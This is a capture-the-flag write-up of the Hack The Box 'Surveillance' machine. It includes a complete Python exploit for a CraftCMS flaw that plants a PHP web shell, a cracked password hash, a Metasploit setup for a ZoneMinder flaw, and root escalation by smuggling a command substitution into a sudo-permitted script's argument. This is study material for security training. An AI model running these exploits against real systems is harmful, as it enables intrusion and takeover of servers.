# HTB - Surveillance

### TL;DR
This is an Ubuntu machine running a web site built with a vulnerable version of CraftCMS, which can be exploited to get a shell under www-data context. Once inside the host, we move laterally to SSH user using credentials found in the file system. To escalate privileges, we abuse sudoer misconfiguration on installed ZoneMinder software.

**Keywords:**<br>
CraftCMS, ZoneMinder, port forwarding, sudoer misconfiguration

**References:**<br>
https://www.cvedetails.com/cve/CVE-2023-41892/<br>
https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226<br>
https://www.cvedetails.com/cve/CVE-2023-26035/<br>
https://www.rapid7.com/blog/post/2023/11/17/metasploit-weekly-wrap-up-36/<br>
<br>
### PHASE 1. Service enumeration
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-10 16:31 EST
Nmap scan report for 10.129.180.84
Host is up, received user-set (0.087s latency).
Not shown: 61282 closed tcp ports (conn-refused), 4251 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 31.20 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,80 -sV -sC -Pn -vv

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-10 16:32 EST
Nmap scan report for 10.129.180.84
Host is up, received user-set (0.084s latency).
Scanned at 2023-12-10 16:33:00 EST for 10s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 11.07 seconds
```
Enumerate the web site with Firefox, it seems it is built with CraftCMS 4.4.14.

![surveillance1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/9bfb8cef-3e43-46e7-85da-ee7d9f3d2b7b)

For initial foothold, we'll focus on the CMS vulnerabilities.

### PHASE 2: User
Searching for CraftCMS 4.4.14 vulnerabilites, we come across this one https://www.cvedetails.com/cve/CVE-2023-41892/<br>
<br>
And this POC https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226<br>
<br>
The POC cannot be used off-the-shelf, just need a small modification in line 25 (remove the proxies).
The final working exploit code is the following.
```python
import requests
import re
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
        <image>
        <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
        <write filename="info:DOCUMENTROOT/cpresources/shell.php">
        </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files)

def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
    }

    response = requests.post(url, headers=headers, data=data)

    pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
    pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
   
    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    return match1.group(1), match2.group(1)

def trigerImagick(tmpDir):
    
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data)    

def shell(cmd):
    response = requests.get(url + "/cpresources/shell.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py <url>")
        exit()
    else:
        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        tmpDir = "/tmp" if "no value" in upload_tmp_dir else upload_tmp_dir
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)
```
To get the shell, just run the exploit with the host's URL and a `www-data` shell is returned.
```markdown
python3 exploit.py http://surveillance.htb
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Once inside the host, we find a mysql backup in `/var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip`. Just unzip it and dump the contents, we find a hash for user `admin` (matthew), which looks like SHA-256.
```markdown
hashid 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
Analyzing '39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec'
[+] Snefru-256 
[+] SHA-256 
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 
[+] GOST CryptoPro S-Box 
[+] SHA3-256 
[+] Skein-256 
[+] Skein-512(256)
```
This can be cracked with `hashcat`
```markdown
hashcat -m 1400 -a 0 -d 1 hash.txt .\rockyou.txt
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
```
Finally, just SSH in as `matthew`, using password `starcraft122490`
```markdown
ssh matthew@surveillance.htb
```

PHASE 3: Root
Begin from an SSH shell for user `matthew` and list local open connections.
```markdown
netstat -lnput
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```
Forward internal port 8080 to kali 8085 and browse the site with Firefox.
```markdwon
ssh -f -N -L 8085:127.0.0.1:8080 matthew@surveillance.htb
```
It seems a ZoneMinder server is running on host's port 8080. A login portal appears.

![surveillance2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/e62f9973-2e7d-417c-a80f-c9ba54c31a28)

Looking for ZoneMinder vulnerabilities, we discover this one https://www.cvedetails.com/cve/CVE-2023-26035/<br>
<br>
We also search for a POC, but nothing useful is found. However, we find a recently published Metasploit module https://www.rapid7.com/blog/post/2023/11/17/metasploit-weekly-wrap-up-36/<br>
<br>
You may need to update your framework to install this module, since it has been published very recently.
```markdown
sudo apt install -y --only-upgrade metasploit-framework
```
Once installed, just start the framework, load the module and configure it properly. For this, remember that, with the local port forwarding in place, now the victim's 8080 port is accessible from kali's localhost:8085.
```markdown
use unix/webapp/zoneminder_snapshots
set rhosts 0.0.0.0
set rport 8085
set lhost <your IP here>
set targeturi /
set target 0
exploit
```
Once the metepreter session is received, open a shell and find out it is running under the `zoneminder` user context.

![surveillance3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/e516f96d-e31a-4b8e-99a8-10a418dc99e2)

This meterpreter shell is functional, but not interactive. The best option to upgrade the shell is to use the meterpreter session to send a `nc mkfifo` reverse shell to kali, then upgrade to TTY.
```markdown
python3 -c 'import pty;pty.spawn("/bin/bash");'
CTRL-Z
sty raw -echo
export TERM=xterm
```
The resulting shell is interactive and can be used to do some enumeration in the ZoneMinder root directory `/usr/share/zoneminder/www`. Inside this location we launch a `grep` scan for clear text passwords in the file system.
```markdown
grep --color=always -rnw . -ie "PASSWORD" 2> /dev/null
```
A `database.php` file is reported in `/usr/share/zoneminder/www/api/app/Config/database.php` containing mysql credential; however, although this credential can be used to log into the mysql database running on port 3306, this does not lead to anything useful.

![surveillance4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/55e016c9-4e05-4a35-9bcd-ad11d3f49ab8)

Moving forward, next step is to verify if `zoneminder` is a sudoer.
```markdown
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```
This means any user can run any binary called zm*.pl in the `/usr/bin/` directory under the root context, no password will be prompted. Morevoer, any option can be passed to the binary since it uses a wildcard in the sudoers file. This is a wide open configuration which can be abused using wildcard injection.
Prepare a shell exploit.
```markdown
echo 'cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash' > /var/tmp/exploit.sh
chmod +x /var/tmp/exploit.sh
```
Now just run any zm* binary and inject a command calling the exploit, it will be executed under the root context. For example, using `zmupdate` with the `--version` option will force the tool to upgrade the database, and it allows us to inject a command to execute the exploit.
```markdown
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/var/tmp/exploit.sh)'
```
This will execute `exploit.sh` under the root context. Finish the box executing a root bash.
```markdown
/var/tmp/bash -p
whoami
root
```

![surveillance5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/3123f308-5b47-47a2-8622-c3398294518f)
